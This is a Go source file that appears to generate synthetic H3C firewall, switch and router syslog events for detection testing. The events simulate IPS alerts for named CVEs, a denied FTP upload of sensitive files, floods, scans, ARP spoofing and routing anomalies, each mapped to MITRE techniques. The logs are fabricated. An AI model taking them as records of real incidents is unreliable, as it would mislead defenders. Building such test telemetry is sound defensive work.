		Build: func(c *core.Ctx) core.Payload {
			// The attack name and its ID have to come from the same entry, so
			// they are picked together rather than generated twice.
			type sig struct {
				name string
				id   string
				cve  string
			}
			sigs := []sig{
				{"WEB_SERVER_Apache_Log4j_Remote_Code_Execution", "32196", "CVE-2021-44228"},
				{"WEB_SERVER_Microsoft_Exchange_SSRF", "28841", "CVE-2021-26855"},
				{"OS_Windows_SMB_Remote_Code_Execution", "15433", "CVE-2017-0144"},
				{"WEB_CLIENT_Windows_Media_ASF_File_Download_SET", "5707", "CVE-2014-6277"},
			}
			s := sigs[c.Rand().Intn(len(sigs))]
			name := c.P("attack", s.name)
			return h3cPayload(c, c.Env.FWHost, core.SevWarning,
				h3cFastLog("IPS", 4, "IPS_IPV4_INTERZONE", []string{
					"-Context=1",
					h3cField("Protocol", 1001, "TCP"),
					h3cField("Application", 1002, "http"),
					h3cField("SrcIPAddr", 1003, c.P("srcip", c.ExternalIP())),
					h3cField("SrcPort", 1004, fmt.Sprintf("%d", c.EphemeralPort())),
					h3cField("DstIPAddr", 1007, c.P("dstip", c.InternalIP())),
					h3cField("DstPort", 1008, "80"),
					h3cField("RcvVPNInstance", 1042, ""),
					h3cField("SrcZoneName", 1025, "Untrust"),
					h3cField("DstZoneName", 1035, "DMZ"),
					h3cField("UserName", 1113, ""),
					h3cField("PolicyName", 1079, "ips"),
					h3cField("AttackName", 1088, name),
					h3cField("AttackID", 1089, s.id),
					h3cField("Category", 1090, "Other"),
					h3cField("Protection", 1091, "Other"),
					h3cField("SubProtection", 1092, "Other"),
					h3cField("Severity", 1087, "CRITICAL"),
					h3cField("Action", 1053, "Reset & Logging"),
					h3cField("CVE", 1075, s.cve),
				}, h3cTermSemi))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-audit-file-upload", Source: core.SourceH3C,
			Group: "Firewall sessions and policy", Name: "Audited file transfer",
			Desc:    "AUDIT_RULE_MATCH_FILE_IPV4_LOG: the data filtering audit matched a file transfer. An upload to an external host, named user and named file, is the clearest exfiltration record the firewall produces.",
			Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1048", "T1567"},
			Params: []core.Param{hUser, hSrcIP, hDstIP, param("file", "File name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.User())
			return h3cPayload(c, c.Env.FWHost, core.SevInfo,
				h3cFastLog("AUDIT", 6, "AUDIT_RULE_MATCH_FILE_IPV4_LOG", []string{
					h3cField("Protocol", 1001, "TCP"),
					h3cField("SrcIPAddr", 1003, c.P("srcip", c.InternalIP())),
					h3cField("SrcPort", 1004, fmt.Sprintf("%d", c.EphemeralPort())),
					h3cField("DstIPAddr", 1007, c.P("dstip", c.ExternalIP())),
					h3cField("DstPort", 1008, "21"),
					h3cField("SrcZoneName", 1025, "Trust"),
					h3cField("DstZoneName", 1035, "Untrust"),
					h3cField("UserName", 1113, user),
					h3cField("PolicyName", 1079, "data-filter"),
					h3cField("Application", 1002, "ftp"),
					h3cField("Behavior", 1101, "UploadFile"),
					h3cField("BehaviorContent", 1102, fmt.Sprintf("{Account(1103)=%s,FileName(1097)=%s}",
						user, c.P("file", c.Pick("customers.csv", "payroll.xlsx", "backup.7z", "dump.sql")))),
					h3cField("Client", 1110, "PC"),
					h3cField("SoftVersion", 1111, ""),
					h3cField("Action", 1053, "Deny"),
				}, h3cTermSemi))
		},
	})
}

// h3cApp maps a destination port to the application name the SecPath
// application identification engine would report.
func h3cApp(c *core.Ctx, port int) string {
	switch port {
	case 22:
		return "ssh"
	case 23:
		return "telnet"
	case 53:
		return "dns"
	case 80, 8080:
		return "http"
	case 443, 8443:
		return "https"
	case 445:
		return "smb"
	case 3389:
		return "ms-rdp"
	case 1433:
		return "mssql"
	default:
		return "general_tcp"
	}
}

// ---------------------------------------------------------------------------
// Attack defence  (SecPath, Comware 7)
// ---------------------------------------------------------------------------

func registerH3CAttackDefence() {
	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-atk-syn-flood", Source: core.SourceH3C,
			Group: "Attack defence", Name: "SYN flood detected",
			Desc:    "ATK_IP4_SYN_FLOOD: SYN packets to one destination passed the configured rate. Names the protected address, the limit that was crossed and the action taken.",
			Channel: "ATK", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1498.001"},
			Params: []core.Param{hDstIP, hIface},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.FWHost, core.SevErr,
				h3cFastLog("ATK", 3, "ATK_IP4_SYN_FLOOD", []string{
					h3cField("RcvIfName", 1023, h3cFwIface(c)),
					h3cField("DstIPAddr", 1007, c.P("dstip", c.InternalIP())),
					h3cField("RcvVPNInstance", 1042, ""),
					h3cField("UpperLimit", 1049, fmt.Sprintf("%d", c.Pick1(10, 100, 1000))),
					h3cField("Action", 1053, c.Pick("logging", "logging,drop", "logging,client-verify")),
					h3cField("BeginTime_c", 1011, h3cATKTime(c)),
				}, h3cTermStop))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-atk-port-scan", Source: core.SourceH3C,
			Group: "Attack defence", Name: "Port scan detected",
			Desc:    "ATK_IP4_PORTSCAN: the scanning-attack detector saw one source sweep ports on one host. Early-stage reconnaissance against anything the firewall fronts.",
			Channel: "ATK", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1046"},
			Params: []core.Param{hSrcIP, hDstIP, hIface},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.FWHost, core.SevErr,
				h3cFastLog("ATK", 3, "ATK_IP4_PORTSCAN", []string{
					h3cField("SubModule", 1127, "SINGLE"),
					h3cField("RcvIfName", 1023, h3cFwIface(c)),
					h3cField("Protocol", 1001, "TCP"),
					h3cField("SrcIPAddr", 1003, c.P("srcip", c.ExternalIP())),
					h3cField("SndDSLiteTunnelPeer", 1041, "--"),
					h3cField("RcvVPNInstance", 1042, ""),
					h3cField("DstIPAddr", 1007, c.P("dstip", c.InternalIP())),
					h3cField("Action", 1053, "logging,block-source"),
					h3cField("BeginTime_c", 1011, h3cATKTime(c)),
				}, h3cTermStop))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-atk-ip-sweep", Source: core.SourceH3C,
			Group: "Attack defence", Name: "IP sweep detected",
			Desc:    "ATK_IP4_IPSWEEP: one source probed many addresses. Host discovery across a segment, which is what lateral movement starts with.",
			Channel: "ATK", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1018", "T1046"},
			Params: []core.Param{hSrcIP, hIface},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.FWHost, core.SevErr,
				h3cFastLog("ATK", 3, "ATK_IP4_IPSWEEP", []string{
					h3cField("SubModule", 1127, "SINGLE"),
					h3cField("RcvIfName", 1023, h3cFwIface(c)),
					h3cField("Protocol", 1001, c.Pick("TCP", "ICMP")),
					h3cField("SrcIPAddr", 1003, c.P("srcip", c.ExternalIP())),
					h3cField("SndDSLiteTunnelPeer", 1041, "--"),
					h3cField("RcvVPNInstance", 1042, ""),
					h3cField("Action", 1053, "logging,block-source"),
					h3cField("BeginTime_c", 1011, h3cATKTime(c)),
				}, h3cTermStop))
		},
	})
}

// ---------------------------------------------------------------------------
// Port security and Layer 2  (Comware switches)
// ---------------------------------------------------------------------------

func registerH3CSwitching() {
	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-portsec-violation", Source: core.SourceH3C,
			Group: "Port security and Layer 2", Name: "Port security intrusion",
			Desc:    "PORTSEC_VIOLATION: an unauthorised MAC appeared on a secured port and intrusion protection fired. An unapproved device plugged into the access layer.",
			Channel: "PORTSEC", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1200"},
			Params: []core.Param{hIface, hMAC, hVLAN},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.SwitchHost, core.SevNotice,
				h3cLogTight("PORTSEC", 5, "PORTSEC_VIOLATION",
					fmt.Sprintf("-IfName=%s-MACAddr=%s-VLANID=%s-IfStatus=%s; Intrusion protection was triggered.",
						h3cIface(c), h3cMAC(c), h3cVLAN(c), c.Pick("Up", "Down"))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-mac-move", Source: core.SourceH3C,
			Group: "Port security and Layer 2", Name: "MAC address flapping",
			Desc:    "MAC_NOTIFICATION: a MAC address moved between two ports in the same VLAN. Usually a loop, but a MAC that follows an endpoint onto an attacker's port is also how ARP and MAC spoofing look from the switch.",
			Channel: "MAC", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1557.002"},
			Params: []core.Param{hMAC, hVLAN, param("fromiface", "Original port", "auto"), param("toiface", "New port", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			// Both ports have to be distinct and both have to appear in the
			// one sentence, so they are generated once each up front.
			slotA := c.Int(1, 24)
			slotB := slotA + c.Int(1, 12)
			from := c.P("fromiface", fmt.Sprintf("GigabitEthernet1/0/%d", slotA))
			to := c.P("toiface", fmt.Sprintf("GigabitEthernet1/0/%d", slotB))
			return h3cPayload(c, c.Env.SwitchHost, core.SevWarning,
				h3cLog("MAC", 4, "MAC_NOTIFICATION",
					fmt.Sprintf("MAC address %s in VLAN %s has moved from port %s to port %s for %d times",
						h3cMAC(c), h3cVLAN(c), from, to, c.Int(2, 500))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-dot1x-login-failure", Source: core.SourceH3C,
			Group: "Port security and Layer 2", Name: "802.1X authentication failed",
			Desc:    "DOT1X_LOGIN_FAILURE: a supplicant failed 802.1X on an access port. Repeated failures on one port are an unauthorised device trying to get onto the wired network.",
			Channel: "DOT1X", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1200", "T1110"},
			Params: []core.Param{hIface, hMAC, hVLAN, hUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.SwitchHost, core.SevInfo,
				h3cLogTight("DOT1X", 6, "DOT1X_LOGIN_FAILURE",
					fmt.Sprintf("-IfName=%s-MACAddr=%s-VLANID=%s-Username=%s-ErrCode=%d; User failed 802.1X authentication. Reason: %s.",
						h3cIface(c), h3cMAC(c), h3cVLAN(c), c.P("user", c.User()), c.Int(1, 9),
						c.Pick("ACL authorization failed", "Authentication failed", "The user failed authentication"))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-stp-bpdu-protection", Source: core.SourceH3C,
			Group: "Port security and Layer 2", Name: "BPDU guard triggered",
			Desc:    "STP_BPDU_PROTECTION: an edge port that should never see BPDUs received one. Either a switch was plugged into an access port or something is trying to join the spanning tree.",
			Channel: "STP", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1200", "T1557"},
			Params: []core.Param{hIface},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.SwitchHost, core.SevWarning,
				h3cLog("STP", 4, "STP_BPDU_PROTECTION",
					fmt.Sprintf("BPDU-Protection port %s received BPDUs.", h3cIface(c))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-stp-root-protection", Source: core.SourceH3C,
			Group: "Port security and Layer 2", Name: "Root guard triggered",
			Desc:    "STP_ROOT_PROTECTION: a port received BPDUs better than its own, which is exactly what a root bridge takeover looks like. Classic Layer 2 position for a man in the middle.",
			Channel: "STP", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1557"},
			Params: []core.Param{hIface, param("instance", "MSTP instance", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.SwitchHost, core.SevWarning,
				h3cLog("STP", 4, "STP_ROOT_PROTECTION",
					fmt.Sprintf("Instance %s's ROOT-Protection port %s received superior BPDUs.",
						c.P("instance", fmt.Sprintf("%d", c.Pick1(0, 1, 2))), h3cIface(c))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-arp-inspection", Source: core.SourceH3C,
			Group: "Port security and Layer 2", Name: "ARP attack detected",
			Desc:    "ARP_INSPECTION: ARP packets that did not match a trusted binding were dropped on a port. ARP spoofing against the access layer, which is how traffic gets redirected for interception.",
			Channel: "ARP", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1557.002"},
			Params: []core.Param{hIface, hSrcIP, hMAC, hVLAN},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.SwitchHost, core.SevNotice,
				h3cLog("ARP", 5, "ARP_INSPECTION",
					fmt.Sprintf("Detected an ARP attack on interface %s: IP %s, MAC %s, VLAN %s. %d packet(s) dropped.",
						h3cIface(c), c.P("srcip", c.InternalIP()), h3cMAC(c), h3cVLAN(c), c.Int(1, 2000))))
		},
	})
}

// ---------------------------------------------------------------------------
// Routing and neighbours  (Comware routers)
// ---------------------------------------------------------------------------

func registerH3CRouting() {
	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-ospf-neighbor-change", Source: core.SourceH3C,
			Group: "Routing and neighbours", Name: "OSPF adjacency changed",
			Desc:    "OSPF_NBR_CHG: an OSPF adjacency moved state. A FULL to DOWN transition that is not a planned change is link failure, or route injection pushing the real neighbour out.",
			Channel: "OSPF", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1498", "T1565.002"},
			Params: []core.Param{param("neighbor", "Neighbour router", "auto"), hIface},
		},
		Build: func(c *core.Ctx) core.Payload {
			// The two states have to be picked as a pair. Picking each one
			// separately would eventually emit "changed from FULL to FULL",
			// which no OSPF implementation logs.
			transitions := [][2]string{
				{"FULL", "DOWN"},
				{"FULL", "INIT"},
				{"LOADING", "FULL"},
				{"EXCHANGE", "DOWN"},
				{"INIT", "DOWN"},
			}
			tr := transitions[c.Rand().Intn(len(transitions))]
			return h3cPayload(c, c.Env.RouterHost, core.SevNotice,
				h3cLog("OSPF", 5, "OSPF_NBR_CHG",
					fmt.Sprintf("OSPF %d Neighbor %s(%s) changed from %s to %s.",
						c.Pick1(1, 100), c.P("neighbor", c.InternalIP()), h3cIface(c),
						tr[0], tr[1])))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-ospf-router-id-conflict", Source: core.SourceH3C,
			Group: "Routing and neighbours", Name: "OSPF router ID conflict",
			Desc:    "OSPF_RTRID_CONFLICT_INTRA: the router received newer self-originated router LSAs, meaning something else is announcing its router ID. That is what OSPF route injection looks like from the victim's side.",
			Channel: "OSPF", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1565.002", "T1557"},
			Params: []core.Param{param("routerid", "Router ID", "auto"), param("area", "OSPF area", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.RouterHost, core.SevInfo,
				h3cLog("OSPF", 6, "OSPF_RTRID_CONFLICT_INTRA",
					fmt.Sprintf("OSPF %d Received newer self-originated router-LSAs. Possible conflict of router ID %s in area %s.",
						c.Pick1(1, 100),
						c.P("routerid", c.InternalIP()),
						c.P("area", c.Pick("0.0.0.0", "0.0.0.1", "0.0.0.10")))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-bgp-state-changed", Source: core.SourceH3C,
			Group: "Routing and neighbours", Name: "BGP peer state changed",
			Desc:    "BGP_STATE_CHANGED: a BGP session changed state. A peer dropping to IDLE, or a peer reaching ESTABLISHED that nobody configured, both deserve a rule.",
			Channel: "BGP", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1565.002"},
			Params: []core.Param{param("peer", "BGP peer", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			// As with OSPF, the FSM states are a pair, not two independent
			// picks.
			transitions := [][2]string{
				{"OPENCONFIRM", "ESTABLISHED"},
				{"ESTABLISHED", "IDLE"},
				{"ACTIVE", "OPENSENT"},
				{"ESTABLISHED", "ACTIVE"},
				{"IDLE", "CONNECT"},
			}
			tr := transitions[c.Rand().Intn(len(transitions))]
			return h3cPayload(c, c.Env.RouterHost, core.SevNotice,
				h3cLog("BGP", 5, "BGP_STATE_CHANGED",
					fmt.Sprintf("BGP.%s:%s state has changed %s to %s.",
						c.Pick("vpn1", "public"), c.P("peer", c.ExternalIP()),
						tr[0], tr[1])))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-bgp-route-flap", Source: core.SourceH3C,
			Group: "Routing and neighbours", Name: "BGP route flapping",
			Desc:    "BGP_LOG_ROUTE_FLAP: a prefix learned from a peer kept being withdrawn and readvertised. Sustained flapping on a prefix that matters is interference with reachability.",
			Channel: "BGP", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1565.002", "T1498"},
			Params: []core.Param{param("peer", "BGP peer", "auto"), param("prefix", "Prefix", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.RouterHost, core.SevWarning,
				h3cLog("BGP", 4, "BGP_LOG_ROUTE_FLAP",
					fmt.Sprintf("BGP.%s: The route %s learned from peer %s (IPv4-UNC) flapped.",
						c.Pick("vpn1", "public"),
						c.P("prefix", fmt.Sprintf("%s.0/24", c.Env.Subnet)),
						c.P("peer", c.ExternalIP()))))
		},
	})
}
